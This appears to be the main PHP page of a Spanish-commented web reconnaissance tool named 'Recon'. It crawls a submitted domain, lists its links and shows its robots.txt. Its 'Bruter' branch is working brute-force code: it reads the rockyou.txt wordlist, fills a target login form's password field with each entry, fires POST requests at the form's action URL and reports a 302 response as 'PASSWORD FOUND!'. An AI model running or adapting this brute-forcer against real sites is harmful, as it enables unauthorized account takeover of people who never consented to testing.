<?php
require_once __DIR__."/src/fuzzer/Domain.class.php";
require_once __DIR__."/src/fuzzer/Request.class.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <link rel="stylesheet" href="assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/styles.css">
        <script type="text/javascript" src="assets/js/myjs.js"></script>
        <script type="text/javascript" src="assets/js/jquery.js"></script>
        <meta charset="utf-8">
        <title>Recon</title>
    </head>
    <body>
        <!--Definiendo el header -->
         <div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column">
           <header class="masthead mb-auto">
             <div class="inner">
               <nav class="nav nav-masthead justify-content-center">
                 <button class="nav-link active" id="index">Index</button>
                 <button class="nav-link" id ='comment' >Comments</button>
                 <button class="nav-link" id='form'>Forms</button>
                 <button class="nav-link" id='header'>Headers</button>
                 <button class="nav-link" id='bruter'>Bruter</button>
               </nav>
             </div>
           </header>
           <!--Fin header -->
           <form action="" method="POST">
               <h2 class="text-center2">Domain:</h2>
               <input type="text" class="input-center" placeholder="https://www.mypage.com" name="domain" autofocus><br>
               <input type="submit" name="enviar" class="text-center2">
           </form>
         </div>
        <?php
        set_time_limit(0);

        //
        if(isset($_POST['bruter']))
        {
            $list = file_get_contents('dics/rockyou.txt');
            $words = explode("\n" , $list);
            $action = $_POST['action'];
            $method = 'POST';
            $params = json_decode($_POST['params'], true);
            $i = 0;
            $urls = [];

            foreach($words as $word)
            {
                $paramsRequest = [];
                foreach($params as $param)
                {
                    $name = $param['name'];
                    $value = $param['value'];
                    $type = $param['type'];
                    //ADDING PARAMS
                    if($value != "")
                    {
                        $paramsRequest[] = ['name'=>$name,'value'=>$value,'type'=>$type];
                    }
                    else
                    {
                        if($name == 'mail' || $type == "email" || $name =="email")
                        {
                            $paramsRequest[] = ['name'=>$name,'value'=>'a@a','type'=>$type];
                        }
                        elseif(strtolower($type) == 'password' || $name == 'password')
                        {
                            $paramsRequest[] = ['name'=>'contraseña','value'=>$word,'type'=>$type];
                        }
                        else
                        {
                            $paramsRequest[] = ['name'=>$name,'value'=>'admin','type'=>$type];
                        }
                    }
                }
                $urls[] = ['url'=>$action,'params'=>$paramsRequest];
            }

            $r = new Request([$action]);
            $responses = $r->doPostRequests($urls);
            foreach($responses as $response)
            {
                $params = $response['params'];
                echo $response['http_code'];
                echo "<br>";
                if($response['http_code'] == 302)
                {
                    echo "PASSWORD FOUND!";
                    print_r($params);
                }
            }
        }

        //
        if(isset($_POST['domain']) && isset($_POST['enviar']))
        {
            $domain = $_POST['domain'];
            if(!filter_var($domain, FILTER_VALIDATE_URL))
                die("<strong style='color:red'>URL INVALIDA!!!</strong>");

            $extension = pathinfo(parse_url($domain)['path'], PATHINFO_EXTENSION);
            if($domain[strlen($domain)-1] != "/" && $extension == "")
                $domain = $domain.'/';
            echo "<br><br><h2>Results for <strong>$domain: </strong></h2>";
            $domain = new Domain($domain);
            $start_time = microtime(true);
            $urls = $domain->getDataScan();
            $end_time = microtime(true);
            $execution_time = ($end_time - $start_time);
            //$domain->getPublicInfo();
            //INFO SCAN
            echo "<div id='resume'>";
            echo "<p>Total enlaces encontrados  : <strong>". count($urls) ." </strong></p>";
            echo "<p>Resultados obtenidos en <strong>".$execution_time."</strong> segundos....</p><br>";
            echo "</div>";
            //GETTING CONTENT OF ROBOTS.TXT FILE
            echo $domain->getRobotsFile();
            echo $domain->getParsedDataScan();
        }
        ?>
    </body>
</html>
